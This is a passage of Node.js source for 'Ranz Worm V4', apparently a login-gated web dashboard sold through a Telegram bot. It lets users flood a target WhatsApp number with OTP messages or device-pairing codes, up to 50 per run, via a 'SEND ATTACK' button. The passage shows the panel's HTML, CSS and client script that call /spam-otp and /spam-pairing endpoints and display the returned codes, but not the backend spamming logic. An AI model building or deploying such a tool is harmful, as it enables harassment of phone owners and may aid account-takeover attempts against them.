    console.log(`${c.cyan}[+]${c.reset} Owner ID: ${c.yellow}${OWNER_ID}${c.reset}`);
    console.log(`${c.cyan}[+]${c.reset} Server Port: ${c.yellow}${PORT}${c.reset}`);
    console.log(`${c.cyan}[+]${c.reset} Users DB: ${c.yellow}${USERS_FILE}${c.reset}`);
    console.log(`${c.cyan}[+]${c.reset} Bot Status: ${c.green}Active${c.reset}`);
    console.log(`${c.cyan}[+]${c.reset} Spam Pairing: ${c.green}Multiple Mode Active (Max 50)${c.reset}`);
    console.log('');
}

// =============================================
// HTML DASHBOARD KECE DENGAN PAIRING SPAM
// =============================================

const loginPageHTML = `
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ranz System - Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600;700&display=swap');
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #0a0a0f 0%, #1a0a2e 30%, #0d1b2a 60%, #0a0a0f 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            position: relative;
            overflow-x: hidden;
        }
        
        .grid-bg {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-image: linear-gradient(rgba(139, 92, 246, 0.03) 1px, transparent 1px), linear-gradient(90deg, rgba(139, 92, 246, 0.03) 1px, transparent 1px);
            background-size: 50px 50px;
            z-index: 0;
        }
        
        .particles {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            pointer-events: none;
            z-index: 0;
        }
        
        .particle {
            position: absolute;
            width: 2px; height: 2px;
            background: #8b5cf6;
            border-radius: 50%;
            animation: float 6s infinite;
            opacity: 0;
        }
        
        @keyframes float {
            0% { transform: translateY(100vh) scale(0); opacity: 0; }
            10% { opacity: 1; }
            90% { opacity: 1; }
            100% { transform: translateY(-100vh) scale(1.5); opacity: 0; }
        }
        
        .container {
            position: relative;
            z-index: 1;
            width: 440px;
            max-width: 95%;
        }
        
        .login-card, .dash-card {
            background: rgba(15, 15, 25, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            border: 1px solid rgba(139, 92, 246, 0.3);
            border-radius: 24px;
            padding: 48px 36px;
            box-shadow: 0 0 60px rgba(139, 92, 246, 0.1), 0 0 120px rgba(139, 92, 246, 0.05), inset 0 0 30px rgba(139, 92, 246, 0.05);
            position: relative;
            overflow: hidden;
        }
        
        .login-card::before, .dash-card::before {
            content: '';
            position: absolute;
            top: -50%; left: -50%;
            width: 200%; height: 200%;
            background: radial-gradient(circle, rgba(139, 92, 246, 0.1) 0%, transparent 70%);
            animation: rotate 20s linear infinite;
        }
        
        @keyframes rotate {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .card-content {
            position: relative;
            z-index: 1;
        }
        
        .logo-section {
            text-align: center;
            margin-bottom: 32px;
        }
        
        .logo-icon {
            width: 64px; height: 64px;
            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
            border-radius: 16px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
            box-shadow: 0 0 30px rgba(139, 92, 246, 0.4);
            position: relative;
        }
        
        .logo-icon::after {
            content: '';
            position: absolute;
            inset: -3px;
            border-radius: 19px;
            background: linear-gradient(135deg, #8b5cf6, #ec4899, #8b5cf6);
            z-index: -1;
            animation: borderGlow 2s infinite;
        }
        
        @keyframes borderGlow {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
        
        .logo-icon svg {
            width: 32px; height: 32px;
            fill: white;
        }
        
        .system-name {
            font-family: 'Orbitron', sans-serif;
            font-size: 28px;
            font-weight: 900;
            background: linear-gradient(135deg, #8b5cf6, #c084fc, #ec4899);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            letter-spacing: 2px;
            margin-bottom: 4px;
        }
        
        .system-subtitle {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.4);
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 4px;
            text-transform: uppercase;
        }
        
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        .input-group label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: rgba(255, 255, 255, 0.6);
            margin-bottom: 8px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        .input-wrapper .icon {
            position: absolute;
            left: 16px;
            top: 50%;
            transform: translateY(-50%);
            color: rgba(255, 255, 255, 0.3);
            z-index: 2;
        }
        
        .input-field {
            width: 100%;
            padding: 14px 16px 14px 48px;
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 12px;
            color: white;
            font-size: 15px;
            font-family: 'Inter', sans-serif;
            transition: all 0.3s ease;
            outline: none;
        }
        
        .input-field.no-icon {
            padding-left: 16px;
        }
        
        .input-field:focus {
            border-color: #8b5cf6;
            box-shadow: 0 0 20px rgba(139, 92, 246, 0.15);
            background: rgba(139, 92, 246, 0.05);
        }
        
        .input-field::placeholder {
            color: rgba(255, 255, 255, 0.2);
        }
        
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            color: white;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            font-family: 'Inter', sans-serif;
            letter-spacing: 1px;
            margin-top: 8px;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #8b5cf6, #6d28d9);
        }
        
        .btn-danger {
            background: linear-gradient(135deg, #ef4444, #dc2626);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #22c55e, #16a34a);
        }
        
        .btn:hover {
            transform: translateY(-2px);
        }
        
        .btn-primary:hover {
            box-shadow: 0 10px 30px rgba(139, 92, 246, 0.4);
        }
        
        .btn-danger:hover {
            box-shadow: 0 10px 25px rgba(239, 68, 68, 0.4);
        }
        
        .btn-success:hover {
            box-shadow: 0 10px 25px rgba(34, 197, 94, 0.4);
        }
        
        .btn:active {
            transform: translateY(0);
        }
        
        .btn::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
            transition: left 0.5s;
        }
        
        .btn:hover::before {
            left: 100%;
        }
        
        .btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .register-link {
            text-align: center;
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid rgba(255, 255, 255, 0.05);
        }
        
        .register-link p {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.4);
        }
        
        .register-link a {
            color: #8b5cf6;
            text-decoration: none;
            font-weight: 600;
            transition: color 0.3s;
        }
        
        .register-link a:hover {
            color: #c084fc;
        }
        
        .telegram-badge {
            display: inline-flex;
            align-items: center;
            gap: 6px;
            background: rgba(0, 136, 204, 0.2);
            border: 1px solid rgba(0, 136, 204, 0.3);
            border-radius: 20px;
            padding: 6px 14px;
            font-size: 12px;
            color: #2ea6d6;
            margin-top: 10px;
        }
        
        .error-message {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            border-radius: 10px;
            padding: 12px;
            color: #ef4444;
            font-size: 13px;
            text-align: center;
            margin-top: 12px;
            display: none;
        }
        
        .error-message.show { display: block; }
        
        .success-message {
            background: rgba(34, 197, 94, 0.1);
            border: 1px solid rgba(34, 197, 94, 0.3);
            border-radius: 10px;
            padding: 12px;
            color: #22c55e;
            font-size: 13px;
            text-align: center;
            margin-top: 12px;
            display: none;
        }
        
        .success-message.show { display: block; }
        
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.9);
            z-index: 1000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        
        .loading-overlay.show { display: flex; }
        
        .verification-box {
            background: rgba(15, 15, 25, 0.95);
            border: 1px solid rgba(139, 92, 246, 0.3);
            border-radius: 20px;
            padding: 40px;
            text-align: center;
            width: 380px;
            max-width: 90%;
        }
        
        .verification-steps {
            display: flex;
            flex-direction: column;
            gap: 16px;
            margin: 24px 0;
        }
        
        .verification-step {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            background: rgba(255,255,255,0.03);
            border-radius: 10px;
            border: 1px solid rgba(255,255,255,0.05);
        }
        
        .step-icon {
            width: 32px; height: 32px;
            border-radius: 50%;
            background: rgba(139, 92, 246, 0.2);
            display: flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
        }
        
        .step-icon.complete {
            background: rgba(34, 197, 94, 0.2);
        }
        
        .step-icon.loading {
            animation: pulse 1.5s infinite;
        }
        
        @keyframes pulse {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }
        
        .step-text {
            color: rgba(255,255,255,0.6);
            font-size: 13px;
            flex: 1;
            text-align: left;
        }
        
        .step-text.complete {
            color: #22c55e;
        }
        
        .spinner {
            width: 48px; height: 48px;
            border: 3px solid rgba(139, 92, 246, 0.2);
            border-top-color: #8b5cf6;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .dashboard {
            display: none;
        }
        
        .dashboard.show {
            display: block;
        }
        
        .dash-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 24px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }
        
        .dash-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 22px;
            font-weight: 700;
            color: white;
        }
        
        .dash-subtitle {
            font-size: 12px;
            color: rgba(255,255,255,0.4);
            font-family: 'Orbitron', sans-serif;
            letter-spacing: 3px;
            text-transform: uppercase;
            margin-top: 4px;
        }
        
        .dash-username {
            color: #8b5cf6;
            font-size: 14px;
        }
        
        .logout-btn {
            background: transparent;
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #ef4444;
            padding: 8px 16px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 12px;
            transition: all 0.3s;
        }
        
        .logout-btn:hover {
            background: rgba(239, 68, 68, 0.1);
        }
        
        .menu-label {
            color: rgba(255,255,255,0.5);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 3px;
            margin-bottom: 12px;
        }
        
        .menu-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            margin-bottom: 24px;
        }
        
        .menu-item {
            padding: 16px 12px;
            background: rgba(255,255,255,0.03);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 12px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            color: white;
            font-size: 12px;
            font-weight: 500;
        }
        
        .menu-item:hover {
            background: rgba(139, 92, 246, 0.1);
            border-color: rgba(139, 92, 246, 0.3);
        }
        
        .menu-item.active {
            background: rgba(139, 92, 246, 0.2);
            border-color: #8b5cf6;
            box-shadow: 0 0 20px rgba(139, 92, 246, 0.2);
        }
        
        .menu-item-icon {
            font-size: 24px;
            margin-bottom: 6px;
        }
        
        .target-section {
            display: none;
            padding: 20px;
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 16px;
            margin-top: 8px;
            animation: fadeIn 0.3s ease;
        }
        
        .target-section.show {
            display: block;
        }
        
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
        
        .pairing-code-display {
            background: rgba(0,0,0,0.5);
            border: 1px solid rgba(139, 92, 246, 0.4);
            border-radius: 12px;
            padding: 16px;
            margin: 12px 0;
            text-align: center;
            font-family: 'Orbitron', monospace;
            font-size: 18px;
            color: #8b5cf6;
            letter-spacing: 3px;
            display: none;
        }
        
        .pairing-code-display.show {
            display: block;
            animation: glowPulse 1.5s infinite;
        }
        
        @keyframes glowPulse {
            0%, 100% { box-shadow: 0 0 10px rgba(139, 92, 246, 0.3); }
            50% { box-shadow: 0 0 30px rgba(139, 92, 246, 0.6); }
        }
        
        .progress-bar-container {
            width: 100%;
            height: 6px;
            background: rgba(255,255,255,0.05);
            border-radius: 3px;
            margin: 12px 0;
            overflow: hidden;
            display: none;
        }
        
        .progress-bar-container.show {
            display: block;
        }
        
        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, #8b5cf6, #ec4899);
            border-radius: 3px;
            transition: width 0.3s ease;
            width: 0%;
        }
        
        .result-box {
            margin-top: 12px;
            padding: 12px;
            background: rgba(0,0,0,0.3);
            border-radius: 10px;
            max-height: 250px;
            overflow-y: auto;
            font-size: 11px;
            color: rgba(255,255,255,0.7);
            display: none;
        }
        
        .result-box.show {
            display: block;
        }
        
        .result-item {
            padding: 6px 8px;
            border-bottom: 1px solid rgba(255,255,255,0.03);
            font-family: 'Orbitron', monospace;
            font-size: 11px;
        }
        
        .result-item .code {
            color: #8b5cf6;
            font-weight: 700;
        }
        
        .result-item .status-sent {
            color: #22c55e;
        }
        
        .result-item .status-error {
            color: #ef4444;
        }
        
        .status-badge {
            display: inline-block;
            padding: 4px 10px;
            border-radius: 20px;
            font-size: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .status-badge.processing {
            background: rgba(234, 179, 8, 0.2);
            color: #eab308;
            border: 1px solid rgba(234, 179, 8, 0.3);
        }
        
        .status-badge.complete {
            background: rgba(34, 197, 94, 0.2);
            color: #22c55e;
            border: 1px solid rgba(34, 197, 94, 0.3);
        }
        
        .footer-text {
            text-align: center;
            margin-top: 20px;
            font-size: 11px;
            color: rgba(255,255,255,0.2);
            letter-spacing: 2px;
        }
    </style>
</head>
<body>

    <div class="grid-bg"></div>
    <div class="particles" id="particles"></div>

    <!-- Login Page -->
    <div class="container" id="login-page">
        <div class="login-card">
            <div class="card-content">
                <div class="logo-section">
                    <div class="logo-icon">
                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/></svg>
                    </div>
                    <div class="system-name">RANZ SYSTEM</div>
                    <div class="system-subtitle">Authentication Portal</div>
                </div>
                
                <form id="login-form">
                    <div class="input-group">
                        <label>Username</label>
                        <div class="input-wrapper">
                            <span class="icon">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="8" r="4"/><path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"/></svg>
                            </span>
                            <input type="text" class="input-field" id="username" placeholder="Enter username" required>
                        </div>
                    </div>
                    
                    <div class="input-group">
                        <label>Password</label>
                        <div class="input-wrapper">
                            <span class="icon">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                            </span>
                            <input type="password" class="input-field" id="password" placeholder="Enter password" required>
                        </div>
                    </div>
                    
                    <div class="error-message" id="login-error"></div>
                    
                    <button type="submit" class="btn btn-primary">AUTHENTICATE</button>
                </form>
                
                <div class="register-link">
                    <p>Belum punya akun? <a href="https://t.me/RanzWormBot" target="_blank">Daftar via Telegram</a></p>
                    <div class="telegram-badge">
                        <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm4.64 6.8c-.15 1.58-.8 5.42-1.13 7.19-.14.75-.42 1-.68 1.03-.58.05-1.02-.38-1.58-.75-.88-.58-1.38-.94-2.23-1.5-.99-.65-.35-1.01.22-1.59.15-.15 2.71-2.48 2.76-2.69.01-.03.01-.14-.05-.2-.07-.05-.17-.03-.24-.02-.1.02-1.73 1.1-4.88 3.22-.46.32-.88.47-1.25.46-.41-.01-1.2-.23-1.79-.42-.72-.24-1.29-.36-1.24-.76.03-.21.31-.42.85-.64 3.34-1.45 5.56-2.41 6.67-2.87 3.17-1.32 3.83-1.55 4.26-1.56.09 0 .3.02.43.13.11.09.14.22.15.26.01.04.02.15.01.24z"/></svg>
                        @RanzWormBot
                    </div>
                </div>
            </div>
        </div>
        <div class="footer-text">ENGINEERED BY RANZKECEBET</div>
    </div>

    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loading-overlay">
        <div class="verification-box">
            <div class="system-name" style="font-size:20px;">VERIFYING</div>
            <div class="spinner"></div>
            <div class="verification-steps">
                <div class="verification-step" id="step1">
                    <div class="step-icon loading">🔐</div>
                    <span class="step-text">Verifying credentials...</span>
                </div>
                <div class="verification-step" id="step2">
                    <div class="step-icon">📡</div>
                    <span class="step-text">Connecting to server...</span>
                </div>
                <div class="verification-step" id="step3">
                    <div class="step-icon">🛡️</div>
                    <span class="step-text">Security check...</span>
                </div>
                <div class="verification-step" id="step4">
                    <div class="step-icon">✅</div>
                    <span class="step-text">Loading dashboard...</span>
                </div>
            </div>
        </div>
    </div>

    <!-- Dashboard -->
    <div class="container dashboard" id="dashboard">
        <div class="dash-card">
            <div class="card-content">
                <div class="dash-header">
                    <div>
                        <div class="dash-title">🐍 DASHBOARD</div>
                        <div class="dash-subtitle">Ranz Worm V4 System</div>
                        <div class="dash-username" id="dash-username" style="margin-top:8px;"></div>
                    </div>
                    <button class="logout-btn" onclick="logout()">LOGOUT</button>
                </div>
                
                <div class="menu-label">Pilih Menu</div>
                
                <div class="menu-grid">
                    <div class="menu-item" data-menu="otp" onclick="selectMenu('otp', this)">
                        <div class="menu-item-icon">📱</div>
                        <div>Spam OTP</div>
                    </div>
                    <div class="menu-item" data-menu="pairing" onclick="selectMenu('pairing', this)">
                        <div class="menu-item-icon">🔗</div>
                        <div>Spam Pairing</div>
                    </div>
                    <div class="menu-item" data-menu="none" onclick="selectMenu('none', this)">
                        <div class="menu-item-icon">🚫</div>
                        <div>Tidak Ada</div>
                    </div>
                </div>
                
                <!-- Target Section -->
                <div class="target-section" id="target-section">
                    <div class="menu-label" id="target-section-title">Target</div>
                    
                    <div class="input-group">
                        <label>Nomor Target (WhatsApp)</label>
                        <div class="input-wrapper">
                            <span class="icon">
                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>
                            </span>
                            <input type="text" class="input-field" id="target-number" placeholder="628xxxxxxxxxx" required>
                        </div>
                    </div>
                    
                    <div class="input-group">
                        <label>Jumlah Spam</label>
                        <div class="input-wrapper">
                            <input type="number" class="input-field no-icon" id="spam-count" value="5" min="1" max="50" required>
                        </div>
                    </div>
                    
                    <div class="status-badge processing" id="status-badge" style="display:none;">PROCESSING...</div>
                    <div class="status-badge complete" id="status-badge-complete" style="display:none;">COMPLETE</div>
                    
                    <div class="progress-bar-container" id="progress-container">
                        <div class="progress-bar" id="progress-bar"></div>
                    </div>
                    
                    <div class="pairing-code-display" id="pairing-code-display">
                        <div style="font-size:11px;color:rgba(255,255,255,0.5);margin-bottom:4px;">LATEST PAIRING CODE</div>
                        <div id="current-code">----</div>
                    </div>
                    
                    <button class="btn btn-danger" id="send-btn" onclick="executeSpam()">
                        ⚡ SEND ATTACK
                    </button>
                    
                    <div class="result-box" id="result-box"></div>
                </div>
            </div>
        </div>
        <div class="footer-text">ENGINEERED BY RANZKECEBET | SPAM PAIRING MULTIPLE</div>
    </div>

    <script>
        let selectedMenu = 'none';
        let currentUser = null;
        let eventSource = null;
        let isProcessing = false;
        
        // Generate particles
        function createParticles() {
            const container = document.getElementById('particles');
            for (let i = 0; i < 50; i++) {
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.left = Math.random() * 100 + '%';
                particle.style.animationDelay = Math.random() * 6 + 's';
                particle.style.animationDuration = (4 + Math.random() * 8) + 's';
                container.appendChild(particle);
            }
        }
        createParticles();
        
        // Check session
        async function checkSession() {
            try {
                const res = await fetch('/check-session');
                const data = await res.json();
                if (data.status === 'success') {
                    currentUser = data;
                    showDashboard(data.username);
                }
            } catch(e) {}
        }
        checkSession();
        
        // Login
        document.getElementById('login-form').addEventListener('submit', async function(e) {
            e.preventDefault();
            
            const username = document.getElementById('username').value.trim();
            const password = document.getElementById('password').value.trim();
            const errorEl = document.getElementById('login-error');
            
            if (!username || !password) {
                errorEl.textContent = 'Please fill all fields.';
                errorEl.classList.add('show');
                return;
            }
            
            document.getElementById('loading-overlay').classList.add('show');
            document.querySelector('#login-form .btn').disabled = true;
            
            const steps = ['step1', 'step2', 'step3', 'step4'];
            for (let i = 0; i < steps.length; i++) {
                await new Promise(resolve => setTimeout(resolve, 800 + Math.random() * 600));
                const stepEl = document.getElementById(steps[i]);
                const iconEl = stepEl.querySelector('.step-icon');
                iconEl.classList.remove('loading');
                iconEl.classList.add('complete');
                iconEl.textContent = '✓';
                stepEl.querySelector('.step-text').classList.add('complete');
            }
            
            try {
                const res = await fetch('/login', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ username, password })
                });
                
                const data = await res.json();
                
                if (data.status === 'success') {
                    await new Promise(resolve => setTimeout(resolve, 1000));
                    document.getElementById('loading-overlay').classList.remove('show');
                    currentUser = data;
                    showDashboard(data.username);
                } else {
                    await new Promise(resolve => setTimeout(resolve, 500));
                    document.getElementById('loading-overlay').classList.remove('show');
                    errorEl.textContent = data.message || 'Login failed.';
                    errorEl.classList.add('show');
                    document.querySelector('#login-form .btn').disabled = false;
                }
            } catch(err) {
                document.getElementById('loading-overlay').classList.remove('show');
                errorEl.textContent = 'Connection error.';
                errorEl.classList.add('show');
                document.querySelector('#login-form .btn').disabled = false;
            }
        });
        
        function showDashboard(username) {
            document.getElementById('login-page').style.display = 'none';
            document.getElementById('dashboard').classList.add('show');
            document.getElementById('dash-username').textContent = '👤 @' + username;
            connectSSE(username);
        }
        
        function connectSSE(username) {
            if (eventSource) eventSource.close();
            
            eventSource = new EventSource('/events?username=' + encodeURIComponent(username));
            
            eventSource.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    handleSSEEvent(data);
                } catch(e) {}
            };
            
            eventSource.onerror = function() {
                setTimeout(() => connectSSE(username), 5000);
            };
        }
        
        function handleSSEEvent(data) {
            if (data.type === 'pairing_result' || data.type === 'status') {
                const resultBox = document.getElementById('result-box');
                const codeDisplay = document.getElementById('pairing-code-display');
                const currentCode = document.getElementById('current-code');
                const progressBar = document.getElementById('progress-bar');
                const progressContainer = document.getElementById('progress-container');
                
                if (data.type === 'pairing_result' && data.result) {
                    resultBox.classList.add('show');
                    
                    const statusClass = data.result.status === 'sent' ? 'status-sent' : 'status-error';
                    const resultHTML = '<div class="result-item">#' + data.result.number + 
                        ' | <span class="code">' + data.result.code + '</span>' +
                        ' | <span class="' + statusClass + '">' + data.result.status + '</span>' +
                        '</div>';
                    
                    resultBox.innerHTML += resultHTML;
                    resultBox.scrollTop = resultBox.scrollHeight;
                    
                    if (data.result.code && data.result.code !== 'N/A' && data.result.code !== 'ERROR') {
                        codeDisplay.classList.add('show');
                        currentCode.textContent = data.result.code;
                    }
                }
                
                if (data.progress) {
                    progressContainer.classList.add('show');
                    const percentage = (data.progress.current / data.progress.total) * 100;
                    progressBar.style.width = percentage + '%';
                }
            }
            
            if (data.type === 'complete') {
                isProcessing = false;
                document.getElementById('send-btn').disabled = false;
                document.getElementById('send-btn').textContent = '⚡ SEND ATTACK';
                
                document.getElementById('status-badge').style.display = 'none';
                document.getElementById('status-badge-complete').style.display = 'inline-block';
                
                const resultBox = document.getElementById('result-box');
                resultBox.innerHTML += '<div class="result-item" style="color:#22c55e;text-align:center;padding:8px;">✅ ' + 
                    data.message + '</div>';
                resultBox.scrollTop = resultBox.scrollHeight;
                
                setTimeout(() => {
                    document.getElementById('status-badge-complete').style.display = 'none';
                }, 5000);
            }
            
            if (data.type === 'error') {
                isProcessing = false;
                document.getElementById('send-btn').disabled = false;
                document.getElementById('send-btn').textContent = '⚡ SEND ATTACK';
                document.getElementById('status-badge').style.display = 'none';
                
                const resultBox = document.getElementById('result-box');
                resultBox.classList.add('show');
                resultBox.innerHTML += '<div class="result-item" style="color:#ef4444;text-align:center;padding:8px;">❌ ' + 
                    data.message + '</div>';
            }
        }
        
        function logout() {
            document.cookie = 'session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';
            if (eventSource) eventSource.close();
            document.getElementById('dashboard').classList.remove('show');
            document.getElementById('login-page').style.display = 'block';
            document.getElementById('username').value = '';
            document.getElementById('password').value = '';
            currentUser = null;
            selectedMenu = 'none';
            resetUI();
        }
        
        function selectMenu(menu, element) {
            selectedMenu = menu;
            document.querySelectorAll('.menu-item').forEach(el => el.classList.remove('active'));
            element.classList.add('active');
            
            const targetSection = document.getElementById('target-section');
            const targetTitle = document.getElementById('target-section-title');
            
            if (menu === 'none') {
                targetSection.classList.remove('show');
            } else {
                targetSection.classList.add('show');
                if (menu === 'otp') {
                    targetTitle.textContent = 'Spam OTP Target';
                    document.getElementById('send-btn').className = 'btn btn-danger';
                } else if (menu === 'pairing') {
                    targetTitle.textContent = 'Spam Pairing Target';
                    document.getElementById('send-btn').className = 'btn btn-danger';
                }
                document.getElementById('target-number').focus();
                resetUI();
            }
        }
        
        function resetUI() {
            document.getElementById('result-box').innerHTML = '';
            document.getElementById('result-box').classList.remove('show');
            document.getElementById('pairing-code-display').classList.remove('show');
            document.getElementById('current-code').textContent = '----';
            document.getElementById('progress-bar').style.width = '0%';
            document.getElementById('progress-container').classList.remove('show');
            document.getElementById('status-badge').style.display = 'none';
            document.getElementById('status-badge-complete').style.display = 'none';
        }
        
        async function executeSpam() {
            const target = document.getElementById('target-number').value.trim();
            const count = parseInt(document.getElementById('spam-count').value) || 5;
            
            if (!target) {
                alert('Masukkan nomor target!');
                return;
            }
            
            if (!currentUser) {
                alert('Session expired. Silakan login ulang.');
                logout();
                return;
            }
            
            if (selectedMenu === 'none') {
                alert('Pilih menu terlebih dahulu!');
                return;
            }
            
            if (isProcessing) {
                alert('Sedang memproses. Tunggu selesai.');
                return;
            }
            
            isProcessing = true;
            
            const sendBtn = document.getElementById('send-btn');
            sendBtn.disabled = true;
            sendBtn.textContent = '⏳ PROCESSING...';
            
            resetUI();
            
            document.getElementById('status-badge').style.display = 'inline-block';
            document.getElementById('progress-container').classList.add('show');
            
            if (selectedMenu === 'otp') {
                try {
                    const res = await fetch('/spam-otp', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            target: target,
                            count: Math.min(count, 50),
                            userId: currentUser.userId
                        })
                    });
                    
                    const data = await res.json();
                    
                    const resultBox = document.getElementById('result-box');
                    resultBox.classList.add('show');
                    
                    if (data.status === 'success') {
                        data.results.forEach(r => {
                            resultBox.innerHTML += '<div class="result-item">#' + r.number + 
                                ' | ' + r.service + ' | OTP: <span class="code">' + r.otp + '</span>' +
                                ' | <span class="status-sent">' + r.status + '</span></div>';
                        });
                    }
                    
                    document.getElementById('status-badge').style.display = 'none';
                    document.getElementById('status-badge-complete').style.display = 'inline-block';
                    
                } catch(err) {
                    document.getElementById('result-box').classList.add('show');
                    document.getElementById('result-box').innerHTML += '<div class="result-item" style="color:#ef4444;">Error: ' + err.message + '</div>';
                }
                
                isProcessing = false;
                sendBtn.disabled = false;
                sendBtn.textContent = '⚡ SEND ATTACK';
                
            } else if (selectedMenu === 'pairing') {
                // Gunakan SSE untuk real-time updates
                document.getElementById('result-box').classList.add('show');
                
                try {
                    const res = await fetch('/spam-pairing', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            target: target,
                            count: Math.min(count, 50),
                            username: currentUser.username
                        })
                    });
                    
                    const data = await res.json();
                    console.log('Pairing started:', data);
                    
                } catch(err) {
                    document.getElementById('result-box').innerHTML += '<div class="result-item" style="color:#ef4444;">Error: ' + err.message + '</div>';
                    isProcessing = false;
                    sendBtn.disabled = false;
                    sendBtn.textContent = '⚡ SEND ATTACK';
                }
            }
        }
    </script>
</body>
</html>
`;

// =============================================
// START SERVER
// =============================================

app.listen(PORT, '0.0.0.0', () => {
    printBanner();
    logToFile('Server started on port ' + PORT);
});

process.on('SIGINT', () => {
    console.log(`\n${c.yellow}[!]${c.reset} Shutting down...`);
    bot.stopPolling();
    process.exit(0);
});

process.on('uncaughtException', (err) => {
    console.log(`${c.red}[ERROR]${c.reset} ${err.message}`);
    logToFile('Error: ' + err.message);
});
